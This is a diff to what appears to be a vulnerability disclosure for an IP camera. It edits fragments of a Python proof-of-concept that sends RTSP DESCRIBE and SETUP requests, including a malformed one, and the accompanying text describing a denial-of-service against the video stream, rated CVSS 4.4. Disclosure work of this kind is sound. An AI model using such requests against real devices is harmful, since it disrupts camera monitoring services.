@@ -118,7 +118,7 @@ time.sleep(1)
 describe_res = sock.recv(4096).decode(errors="ignore")
 print("DESCRIBE_2 Response:\n", describe_res)
 
-# 4. SETUP track1 (normal)
+# 4. SETUP track1 
 setup1_req = (
     f"SETUP {RTSP_URI}/track1 RTSP/1.0\r\n"
     f"CSeq: 5\r\n"
@@ -144,7 +144,7 @@ if not session_id:
     sock.close()
     exit(1)
 
-# 5. SETUP track2 (malformed Transport header)
+# 5. SETUP track2 
 setup2_req = (
     f"SETUP {RTSP_URI}/track1 RTSP/1.0\r\n"
     f"CSeq: 6\r\n"
@@ -259,4 +259,5 @@ This vulnerability allows an authenticated attacker to trigger a denial-of-servi
 Successful exploitation interrupts the camera’s RTSP video stream. An attacker can repeatedly trigger this behavior to continuously disrupt RTSP sessions, thereby reducing the availability and stability of the device’s video service in real-world deployment scenarios.
 
 The issue has been assigned a **CVSS v3.1** base score of **4.4(Medium)** with the vector **CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H**
+
 
